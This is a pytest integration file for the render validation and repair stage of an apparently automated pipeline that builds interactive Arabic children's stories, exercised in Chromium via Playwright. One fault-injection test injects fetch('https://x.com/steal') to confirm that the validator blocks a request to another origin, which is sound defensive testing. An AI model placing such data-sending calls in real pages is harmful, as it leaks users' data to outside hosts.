"""S11 render validation and repair loop in real Chromium (spec sample, fault-injection table, 8.5 flow).

Needs Playwright with Chromium; skipped without it. The full golden run takes about a minute."""

import tempfile
from functools import cache

import pytest

import golden
from story_service.devtools.bundle_server import serving
from story_service.pipeline.models import Issue, ScenePlan, ValidationReport
from story_service.pipeline.stages import s11_repair, s11_validate
from story_service.pipeline.stages.s11_validate import S11Result
from story_service.providers.llm import FakeLLM
from story_service.providers.vlm import FakeVLM

pytestmark = pytest.mark.integration
pytest.importorskip("playwright.sync_api")

FAST = {"errors", "blank", "motion", "static", "bounds", "captions", "dom"}


def codes(res: S11Result, severity=None) -> set[str]:
    return {i.code for i in res.issues if severity is None or i.severity == severity}


@cache
def golden_full() -> S11Result:
    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_golden_"))
    with serving(folder) as url:
        return s11_validate.run(url, vlm=FakeVLM(score=5), script=golden.script(), cast=golden.cast(), audio_lines=2)


def validate_injected(css="", js="", checks=FAST, viewport=(1280, 720), vlm=None, build=None):
    folder = golden.write_bundle((build or golden.build()).bundle, tempfile.mkdtemp(prefix="s11_fault_"))
    golden.inject(folder, css=css, js=js)
    with serving(folder) as url:
        return s11_validate.run(
            url, viewport=viewport, checks=checks, vlm=vlm, script=golden.script(), cast=golden.cast()
        )


def with_plan(scene_id: str, change) -> object:
    """The golden build with one scene re-composed from a changed plan, past the S7 gate (fault injection)."""
    b = golden.build()
    plan = golden.plan_dict(scene_id)
    change(plan)
    b.plans[scene_id] = ScenePlan.model_validate(plan)
    b.compose_scene(scene_id)
    b.assemble()
    return b


# ----------------------------------------------------------------------------------------------- the spec sample
def test_s11_golden_bundle_clean():
    res = golden_full()
    assert res.blockers == [] and res.majors == [], [(i.code, i.scene_id, i.message) for i in res.issues]
    assert {r.scene_id for r in res.reports} == {"s01", "s02", "s03", "s04", "s05", None}
    assert res.report("s03").scores["matches_narration"] == 5
    assert res.report(None).scores["continuity"] == 5 and res.report(None).scores["fps"] >= 24


def test_validation_json_shape():
    data = golden_full().to_json()
    s03 = next(r for r in data if r["scene_id"] == "s03")
    assert s03["stage"] == "S11" and {"checks", "scores", "issues", "passed"} <= set(s03)


# ----------------------------------------------------------------------------------------------- fault injection
def test_request_to_another_origin():
    res = validate_injected(js="fetch('https://x.com/steal')", checks={"errors"})
    bad = [i for i in res.blockers if i.code in ("PAGE_ERRORS", "NETWORK")]
    assert bad and all(i.suspect_stage == "S10_assembler" for i in bad)


def test_caption_font_12px():
    res = validate_injected(css="#captions{font-size:12px!important}", checks={"captions"})
    assert "CAPTION_SIZE" in codes(res, "blocker")


def test_caption_contrast():
    res = validate_injected(
        css="#captions{color:#888!important;background:#fff!important}"
        "#captions .w,#captions .who{color:#888!important}",
        checks={"captions"},
    )
    assert "CAPTION_CONTRAST" in codes(res, "blocker")


def test_blank_stage():
    res = validate_injected(css="svg.scene{display:none!important}", checks={"blank"})
    assert "BLANK_FRAME" in codes(res, "blocker")


def test_small_buttons():
    res = validate_injected(
        css=".ctl{min-width:30px!important;width:30px!important;height:30px!important}",
        checks={"touch"},
        viewport=(844, 390),
    )
    assert "TOUCH_TARGET" in codes(res, "major")


def test_overlay_that_cannot_be_closed():
    res = validate_injected(css="#overlay .go{display:none!important}", checks={"playthrough"})
    assert "DEAD_END" in codes(res, "blocker")


def test_actor_out_of_bounds_and_overlap():
    b = with_plan(
        "s03",
        lambda p: p["cues"].append(
            {
                "id": "s03_c99",
                "at": {"line": "s03_l02", "anchor": "start"},
                "target": "karim",
                "action": "move",
                "params": {"to": [-440, 0]},
                "dur_ms": 600,
            }
        ),
    )  # karim walks onto nadia
    res = validate_injected(build=b, checks={"bounds"})
    overlap = [i for i in res.majors if i.code == "OVERLAP"]
    assert overlap and overlap[0].scene_id == "s03" and overlap[0].suspect_stage == "S7_director"


def test_static_stretch():
    b = with_plan("s04", lambda p: p.update(cues=[c for c in p["cues"] if c["action"] == "enter"]))
    res = validate_injected(build=b, checks={"static"})
    assert any(i.code == "STATIC_RUN" and i.scene_id == "s04" for i in res.majors)


def test_vlm_low_characters_consistent_points_at_the_cast():
    res = validate_injected(checks={"vlm"}, vlm=FakeVLM(score=5, scores={"characters_consistent": 3}))
    issues = [i for i in res.majors if i.code == "VLM_CRITIC"]
    assert issues and {i.suspect_stage for i in issues} == {"S5_cast"}


# ----------------------------------------------------------------------------------------------- 8.5 interaction flow
def test_choose_answer_flow():
    from playwright.sync_api import sync_playwright

    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_flow_"))
    with sync_playwright() as p, serving(folder) as url:
        browser = p.chromium.launch(args=["--autoplay-policy=no-user-gesture-required"])
        page = browser.new_page()
        page.goto(url + "/index.html?freeze=1")
        page.evaluate("__story.seek(__story.listInteractions()[1].at_ms - 2000); __story.play()")
        for _ in range(60):
            if page.evaluate("__story.getState().overlayOpen"):
                break
            page.wait_for_timeout(50)
        assert page.evaluate("__story.getState().interaction") == "s03_i1"
        assert page.evaluate("__story.answerInteraction('s03_i1', {option_id: 'a'})")  # wrong
        assert "البسط" in page.inner_text("#overlay")  # its feedback
        page.evaluate("__story.answerInteraction('s03_i1', {option_id: 'b'})")  # right
        page.click("text=متابعة")
        t0 = page.evaluate("__story.getTime()")
        page.wait_for_timeout(2000)
        assert page.evaluate("__story.getTime()") - t0 >= 500
        browser.close()


# ----------------------------------------------------------------------------------------------- the repair loop
def test_s11_repair_loop_fixes_overlap():
    b = with_plan(
        "s03",
        lambda p: p["cues"].append(
            {
                "id": "s03_c99",
                "at": {"line": "s03_l02", "anchor": "start"},
                "target": "karim",
                "action": "move",
                "params": {"to": [-440, 0]},
                "dur_ms": 600,
            }
        ),
    )
    b.llm = FakeLLM(golden.plan_dict("s03"))  # the director's fixed plan
    out = s11_repair.run(b, checks={"bounds"}, viewport=(1280, 720))
    assert out.status == "passed" and out.repairs == {"s03": 1}, out.log
    assert "OVERLAP" in b.llm.calls[0]["user"] and "<current_plan>" in b.llm.calls[0]["user"]


def _fake(issues_per_round):
    """A validator that returns the given issues, round after round (the last one repeats)."""
    rounds = list(issues_per_round)

    def validate(scenes):
        issues = rounds.pop(0) if len(rounds) > 1 else rounds[0]
        rep = ValidationReport(stage="S11", scene_id="s03")
        for i in issues:
            rep.add(i.code, False, i.severity, i.message, code=i.code, suspect_stage=i.suspect_stage)
        rep.issues = [Issue(**{**x.model_dump(), "scene_id": "s03"}) for x in rep.issues]
        return S11Result(reports=[rep])

    return validate


def _issue(code, suspect, severity="major"):
    return Issue(severity=severity, code=code, message=code, suspect_stage=suspect, scene_id="s03")


def test_same_scene_failing_three_rounds_needs_review():
    b = golden.build()
    b.llm = FakeLLM(golden.plan_dict("s03"))
    out = s11_repair.run(b, validate=_fake([[_issue("OUT_OF_BOUNDS", "S7_director")]]))
    assert out.status == "needs_review" and out.repairs == {"s03": 2}


def test_assembler_issue_fails_the_version():
    out = s11_repair.run(golden.build(), validate=_fake([[_issue("AUDIO_SYNC", "S10_assembler")]]))
    assert out.status == "failed" and out.code == "INTERNAL"


def test_cast_issue_reruns_s5_once():
    b = golden.build()
    b.llm = FakeLLM(*[golden.plan_dict(s.id) for s in b.script.scenes])
    seen = []
    out = s11_repair.run(
        b, validate=_fake([[_issue("VLM_CRITIC", "S5_cast")]]), rerun_cast=lambda build, hints: seen.append(hints)
    )
    assert len(seen) == 1 and out.status == "needs_review"


def test_broken_audio_is_caught():
    from pathlib import Path

    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_audio_"))
    for mp3 in (Path(folder) / "audio").glob("*.mp3"):
        mp3.write_bytes(b"not an mp3 at all" * 20)
    with serving(folder) as url:
        res = s11_validate.run(url, viewport=(1280, 720), checks={"errors", "audio"}, audio_lines=2)
    assert codes(res) & {"AUDIO_BROKEN", "AUDIO_NOT_PLAYING"} and not res.passed


def test_partial_run_still_reviews_the_whole_story():
    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_partial_"))
    with serving(folder) as url:
        res = s11_validate.run(
            url, viewport=(1280, 720), checks={"vlm", "captions"}, scenes={"s03"}, vlm=FakeVLM(score=5, continuity=3)
        )
    bundle = res.report(None)
    assert any(c.name == "continuity" and not c.passed for c in bundle.checks)
    assert not any(c.name.startswith("caption") for c in bundle.checks)  # untouched scenes are skipped
    assert {r.scene_id for r in res.reports} == {"s03", None}


# ----------------------------------------------------------------------------------------------- tap reactions
def test_tap_reactions_never_pause_the_story():
    """An addition to the plan (DECISIONS): tapped characters wave and show their name, tapped props show theirs."""
    from playwright.sync_api import sync_playwright

    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_tap_"))
    with sync_playwright() as p, serving(folder) as url:
        browser = p.chromium.launch(args=["--autoplay-policy=no-user-gesture-required"])
        page = browser.new_page(viewport={"width": 1280, "height": 800})
        page.goto(url + "/index.html")
        page.evaluate("__story.seek(3000); __story.play()")
        page.wait_for_timeout(300)
        t0 = page.evaluate("__story.getTime()")
        x, y = page.evaluate(
            "(() => { const r = document.getElementById('s01-karim').getBoundingClientRect();"
            " return [r.x + r.width / 2, r.y + r.height / 3]; })()"
        )
        page.mouse.click(x, y)
        page.wait_for_timeout(200)
        assert page.evaluate("document.getElementById('s01-karim').getAttribute('data-pose')") == "wave"
        assert page.inner_text(".tap-name") == "كريم"
        assert page.evaluate("__story.tap('s01-pizza1')") and page.inner_text(".tap-name") == "بيتزا"
        page.wait_for_timeout(1700)
        assert page.evaluate("document.getElementById('s01-karim').getAttribute('data-pose')") != "wave"
        state = page.evaluate("__story.getState()")
        assert state["playing"] and state["t"] - t0 >= 1500 and state["errors"] == []
        page.evaluate("__story.openInteraction('s03_i1')")
        assert page.evaluate("__story.tap('s03-nadia')") is False  # off while a question is open
        browser.close()


def test_ambient_loops_run_live_and_stop_when_frozen():
    from playwright.sync_api import sync_playwright

    folder = golden.write_bundle(golden.build().bundle, tempfile.mkdtemp(prefix="s11_amb_"))
    count = (
        "document.getAnimations().filter(a => (a.animationName || '').startsWith('amb-')"
        " && a.playState === 'running').length"
    )
    with sync_playwright() as p, serving(folder) as url:
        browser = p.chromium.launch()
        for query, expect_running in (("", True), ("?freeze=1", False)):
            page = browser.new_page()
            page.goto(url + "/index.html" + query)
            page.evaluate("__story.seek(1000)")  # the kitchen: a ticking wall clock, steam, the oven light
            page.wait_for_timeout(300)
            assert (page.evaluate(count) > 0) is expect_running, query
            page.close()
        browser.close()
